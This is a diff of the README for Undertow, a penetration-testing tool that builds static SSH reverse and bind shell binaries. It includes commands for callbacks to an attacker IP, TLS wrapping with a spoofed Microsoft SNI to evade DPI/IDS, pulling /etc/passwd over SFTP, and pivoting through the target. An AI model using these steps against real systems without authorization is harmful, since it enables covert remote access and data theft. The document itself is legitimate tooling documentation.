@@ -1,42 +1,30 @@
 <div align="center">
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/banner.svg">
-  <source media="(prefers-color-scheme: light)" srcset="assets/banner.svg">
-  <img alt="Undertow" src="assets/banner.svg" width="800">
+  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/logo-dark.svg">
+  <source media="(prefers-color-scheme: light)" srcset="docs/assets/logo-light.svg">
+  <img alt="Undertow" src="docs/assets/logo-dark.svg" width="720">
 </picture>
 
-<br>
+<br><br>
 
-**Statically-linked SSH server for penetration testing and CTF challenges**
+[![Go](https://img.shields.io/badge/Go-1.15+-00ADD8?style=flat-square&logo=go&logoColor=white)](https://go.dev)
+[![Platforms](https://img.shields.io/badge/Platforms-Linux%20%7C%20Windows-74c7ec?style=flat-square)](#platform-support)
+[![License: GPLv3](https://img.shields.io/badge/License-GPLv3-b4befe?style=flat-square)](LICENSE)
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.15%2B-00ADD8.svg)](https://go.dev)
-[![Platforms](https://img.shields.io/badge/Platforms-Linux%20%7C%20Windows-brightgreen.svg)](#platform-notes)
+**Statically-linked SSH server for penetration testing and CTF challenges.**
 
-<br>
+Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding — all in a single static binary under 1.5MB.<br>
+Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire.
 
-Undertow provides reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding — all in a single static binary under 1.5MB. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire.
+> **Warning:** This tool is intended for authorized penetration testing and security research only.<br>
+> Unauthorized access to computer systems is illegal. Always obtain written permission before testing.
+
+[Highlights](#highlights) · [Quick Start](#quick-start) · [Usage](#usage) · [TLS Wrapping](#tls-wrapping) · [SSH Features](#ssh-features) · [Build Options](#build-options) · [Architecture](#architecture) · [Docs](https://real-fruit-snacks.github.io/Undertow)
 
 </div>
 
 <br>
-
-## Table of Contents
-
-- [Highlights](#highlights)
-- [Quick Start](#quick-start)
-- [Build Options](#build-options)
-- [Usage](#usage)
-- [TLS Wrapping](#tls-wrapping)
-- [SSH Features](#ssh-features)
-- [Architecture](#architecture)
-- [Authentication](#authentication)
-- [Platform Notes](#platform-notes)
-- [Advanced: Direct Make](#advanced-direct-make)
-- [Runtime Flags](#runtime-flags)
-
----
 
 ## Highlights
 
@@ -105,15 +93,20 @@ All build output uses the [Catppuccin Mocha](https://catppuccin.com/palette) col
 
 ### Prerequisites
 
-| Requirement | Version |
-|-------------|---------|
-| Go | >= 1.15 |
-| Make | Any |
-| UPX | Optional (for `--compress`) |
+<table>
+<tr><th>Requirement</th><th>Version</th><th>Purpose</th></tr>
+<tr><td>Go</td><td>>= 1.15</td><td>Compilation</td></tr>
+<tr><td>Make</td><td>Any</td><td>Build orchestration</td></tr>
+<tr><td>UPX</td><td>Optional</td><td>Binary compression (<code>--compress</code>)</td></tr>
+</table>
 
 ### Build & Deploy
 
 ```bash
+# Clone the repository
+git clone https://github.com/Real-Fruit-Snacks/Undertow.git
+cd Undertow
+
 # Reverse shell — connects back to your machine
 ./build.sh reverse 192.168.1.10:4444
 
@@ -139,6 +132,136 @@ ssh -p 8888 svc@TARGET_IP
 
 ---
 
+## Usage
+
+### Reverse Shell
+
+**Attacker:**
+```bash
+./build.sh reverse YOUR_IP:4444
+./bin/handler-YOUR_IP-4444
+```
+
+**Target:**
+```bash
+./undertow-YOUR_IP-4444-linux-x64
+```
+
+**Connect:** Handler shows the SSH command when callback arrives.
+
+### Bind Shell
+
+**Target:**
+```bash
+./undertow-listen-8888-linux-x64
+```
+
+**Attacker:**
+```bash
+ssh -p 8888 svc@TARGET_IP
+```
+
+### Handler Scripts
+
+The build script auto-generates a handler for reverse mode:
+
+```bash
+# Build generates handler alongside binaries
+./build.sh reverse 10.10.14.5:4444
+
+# Handler starts listener, displays creds, shows SSH command on callback
+./bin/handler-10-10-14-5-4444
+```
+
+### Output
+
+Binaries go to `bin/` with descriptive names:
+
+```
+bin/
+├── undertow-192-168-1-10-4444-linux-x64
+├── undertow-192-168-1-10-4444-linux-x86
+├── undertow-192-168-1-10-4444-windows-x64.exe
+├── undertow-192-168-1-10-4444-windows-x86.exe
+└── handler-192-168-1-10-4444       <- Run this on your attack machine
+```
+
+---
+
+## TLS Wrapping
+
+SSH traffic is identifiable on the wire via the plaintext `SSH-2.0-*` banner. The `--tls` flag wraps SSH inside TLS, making the outer layer look like HTTPS to DPI/IDS.
+
+```
+Without TLS:   Target --SSH--> Attacker:443     (DPI sees SSH banner)
+With TLS:      Target --TLS(SSH)--> Attacker:443  (DPI sees HTTPS)
+```
+
+```bash
+# Reverse shell over TLS on port 443
+./build.sh reverse 10.10.14.5:443 --tls
+
+# Custom SNI hostname (default: www.microsoft.com)
+./build.sh reverse 10.10.14.5:443 --tls --sni update.windows.com
+
+# Bind shell with TLS
+./build.sh listen 443 --tls
+```
+
+| Feature | Detail |
+|---------|--------|
+| **Certificate** | Fresh ECDSA P-256 self-signed cert generated at runtime (no files on disk) |
+| **ALPN** | Negotiates `h2` / `http/1.1` matching real HTTPS traffic |
+| **SNI** | Configurable hostname in ClientHello (default: `www.microsoft.com`) |
+| **SAN** | Certificate SAN matches the SNI hostname |
+| **Both modes** | Works identically in reverse and listen modes |
+| **Transparent** | All SSH features (PTY, SFTP, port forwarding) work unmodified inside the tunnel |
+
+### Connecting to a TLS-Wrapped Listener
+
+Your SSH client needs a TLS tunnel. Use `openssl s_client` or `ncat --ssl` as a proxy:
+
+```bash
+ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p -servername www.microsoft.com' -p 443 svc@TARGET
+```
+
+---
+
+## SSH Features
+
+### File Transfer (SFTP)
+
+```bash
+sftp -P 8888 svc@127.0.0.1
+
+# One-liner
+echo "get /etc/passwd" | sftp -P 8888 svc@127.0.0.1
+```
+
+### Port Forwarding
+
+| Type | Command | Use Case |
+|------|---------|----------|
+| **Local** | `ssh -p 8888 -L 8080:internal:80 svc@127.0.0.1` | Access target's internal services |
+| **Remote** | `ssh -p 8888 -R 9999:localhost:80 svc@127.0.0.1` | Expose your services to target |
+| **Dynamic** | `ssh -p 8888 -D 9050 svc@127.0.0.1` | SOCKS proxy through target |
+
+### SSH Config
+
+Add to `~/.ssh/config` for convenience:
+
+```
+Host target
+    Hostname 127.0.0.1
+    Port 8888
+    StrictHostKeyChecking no
+    UserKnownHostsFile /dev/null
+```
+
+Then: `ssh target`
+
+---
+
 ## Build Options
 
 ```
@@ -150,7 +273,7 @@ Modes:
     listen <PORT>           Build binary that listens on PORT
 ```
 
-### Options
+### Flags
 
 | Option | Default | Description |
 |--------|---------|-------------|
@@ -189,115 +312,6 @@ Modes:
 
 # Preview without building
 ./build.sh reverse 10.10.14.5:443 --tls --dry-run
-```
-
-### Output
-
-Binaries go to `bin/` with descriptive names:
-
-```
-bin/
-├── undertow-192-168-1-10-4444-linux-x64
-├── undertow-192-168-1-10-4444-linux-x86
-├── undertow-192-168-1-10-4444-windows-x64.exe
-├── undertow-192-168-1-10-4444-windows-x86.exe
-└── handler-192-168-1-10-4444       ← Run this on your attack machine
-```
-
----
-
-## Usage
-
-### Reverse Shell
-
-**Attacker:**
-```bash
-./build.sh reverse YOUR_IP:4444
-./bin/handler-YOUR_IP-4444
-```
-
-**Target:**
-```bash
-./undertow-YOUR_IP-4444-linux-x64
-```
-
-**Connect:** Handler shows the SSH command when callback arrives.
-
-### Bind Shell
-
-**Target:**
-```bash
-./undertow-listen-8888-linux-x64
-```
-
-**Attacker:**
-```bash
-ssh -p 8888 svc@TARGET_IP
-```
-
----
-
-## TLS Wrapping
-
-SSH traffic is identifiable on the wire via the plaintext `SSH-2.0-*` banner. The `--tls` flag wraps SSH inside TLS, making the outer layer look like HTTPS to DPI/IDS.
-
-```
-Without TLS:   Target ──SSH──→ Attacker:443     (DPI sees SSH banner)
-With TLS:      Target ──TLS(SSH)──→ Attacker:443  (DPI sees HTTPS)
-```
-
-```bash
-# Reverse shell over TLS on port 443
-./build.sh reverse 10.10.14.5:443 --tls
-
-# Custom SNI hostname (default: www.microsoft.com)
-./build.sh reverse 10.10.14.5:443 --tls --sni update.windows.com
-
-# Bind shell with TLS
-./build.sh listen 443 --tls
-```
-
-| Feature | Detail |
-|---------|--------|
-| **Certificate** | Fresh ECDSA P-256 self-signed cert generated at runtime (no files on disk) |
-| **ALPN** | Negotiates `h2` / `http/1.1` matching real HTTPS traffic |
-| **SNI** | Configurable hostname in ClientHello (default: `www.microsoft.com`) |
-| **SAN** | Certificate SAN matches the SNI hostname |
-| **Both modes** | Works identically in reverse and listen modes |
-| **Transparent** | All SSH features (PTY, SFTP, port forwarding) work unmodified inside the tunnel |
-
-### Connecting to a TLS-Wrapped Listener
-
-Your SSH client needs a TLS tunnel. Use `openssl s_client` or `ncat --ssl` as a proxy:
-
-```bash
-ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p -servername www.microsoft.com' -p 443 svc@TARGET
-```
-
----
-
-## SSH Features
-
-### File Transfer
-
-```bash
-sftp -P 8888 svc@127.0.0.1
-
-# One-liner
-echo "get /etc/passwd" | sftp -P 8888 svc@127.0.0.1
-```
-
-### Port Forwarding
-
-```bash
-# Local: access target's internal services
-ssh -p 8888 -L 8080:internal:80 svc@127.0.0.1
-
-# Remote: expose your services to target
-ssh -p 8888 -R 9999:localhost:80 svc@127.0.0.1
-
-# Dynamic: SOCKS proxy through target
-ssh -p 8888 -D 9050 svc@127.0.0.1
 ```
 
 ---
@@ -361,19 +375,51 @@ undertow/
 ./build.sh reverse IP:PORT --pubkey ~/.ssh/id_ed25519.pub
 ```
 
----
+### Key Generation
 
-## Platform Notes
-
-| Platform | Support |
-|----------|---------|
-| Linux (kernel 2.6.23+) | Full PTY |
-| Windows 10 Build 17763+ | Full ConPTY |
-| Older Windows | Append `cmd` to SSH, or use `--shell ssh-shellhost.exe` |
+The build process handles key generation automatically. The default SSH host key is stored in `assets/id_undertow`. Credentials are displayed during the build process and embedded in the generated handler script.
 
 ---
 
-## Advanced: Direct Make
+## Platform Support
+
+<table>
+<tr><th>Platform</th><th>PTY</th><th>Details</th></tr>
+<tr>
+<td><strong>Linux</strong> (kernel 2.6.23+)</td>
+<td>Full PTY via <code>creack/pty</code></td>
+<td>x86 and x64, static binary, zero dependencies</td>
+</tr>
+<tr>
+<td><strong>Windows 10</strong> (Build 17763+)</td>
+<td>Full ConPTY</td>
+<td>x86 and x64, native ConPTY API for interactive shell</td>
+</tr>
+<tr>
+<td><strong>Older Windows</strong></td>
+<td>Limited</td>
+<td>Append <code>cmd</code> to SSH, or use <code>--shell ssh-shellhost.exe</code></td>
+</tr>
+</table>
+
+---
+
+## Runtime Flags
+
+When CLI is enabled (default), the binary accepts runtime flags:
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-l` | off | Listen mode (bind shell) |
+| `-p` | `31337` | Port |
+| `-b` | `0` | Bind port after reverse |
+| `-s` | `/bin/bash` | Shell |
+| `-N` | off | Port forwarding only |
+| `-v` | off | Verbose |
+
+Use `--nocli` at build time to produce a hardcoded binary with no runtime flags.
+
+### Advanced: Direct Make
 
 For cross-compilation or fine-grained control:
 
@@ -400,41 +446,47 @@ GOARCH=arm64 GOOS=linux make
 
 ---
 
-## Runtime Flags
+## Security
 
-When CLI is enabled, the binary accepts:
+This tool is designed for **authorized penetration testing** and security research. See [SECURITY.md](SECURITY.md) for vulnerability reporting guidelines.
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-l` | off | Listen mode (bind shell) |
-| `-p` | `31337` | Port |
-| `-b` | `0` | Bind port after reverse |
-| `-s` | `/bin/bash` | Shell |
-| `-N` | off | Port forwarding only |
-| `-v` | off | Verbose |
+### Threat Model
 
-### SSH Config
+- Undertow assumes the operator has authorization to deploy the binary
+- TLS wrapping provides transport-layer evasion, not endpoint evasion
+- Credentials are displayed at build time and embedded in handler scripts
+- The binary can be analyzed by reverse engineers — do not rely on obscurity
 
-Add to `~/.ssh/config`:
+---
 
-```
-Host target
-    Hostname 127.0.0.1
-    Port 8888
-    StrictHostKeyChecking no
-    UserKnownHostsFile /dev/null
-```
+## License
 
-Then: `ssh target`
+Undertow is licensed under the [GNU General Public License v3.0](LICENSE).
+
+You are free to use, modify, and distribute this software under the terms of the GPLv3. See the [LICENSE](LICENSE) file for the full license text.
+
+---
+
+## Resources
+
+- [GitHub Repository](https://github.com/Real-Fruit-Snacks/Undertow)
+- [Documentation Site](https://real-fruit-snacks.github.io/Undertow)
+- [Issue Tracker](https://github.com/Real-Fruit-Snacks/Undertow/issues)
+- [Contributing Guide](CONTRIBUTING.md)
+- [Security Policy](SECURITY.md)
+- [Changelog](CHANGELOG.md)
 
 ---
 
 <div align="center">
 
-**Built for offense. Tested in labs.**
+<br>
 
-[GitHub](https://github.com/Real-Fruit-Snacks/Undertow) | [License (GPLv3)](LICENSE) | [Report Issue](https://github.com/Real-Fruit-Snacks/Undertow/issues)
-
-*Undertow — SSH where it shouldn't be*
+<a href="https://github.com/Real-Fruit-Snacks">
+  <picture>
+    <source media="(prefers-color-scheme: dark)" srcset="https://img.shields.io/badge/Real--Fruit--Snacks-Toolkit-b4befe?style=flat-square&logo=github&logoColor=white">
+    <img alt="Real-Fruit-Snacks" src="https://img.shields.io/badge/Real--Fruit--Snacks-Toolkit-6366f1?style=flat-square&logo=github&logoColor=white">
+  </picture>
+</a>
 
 </div>
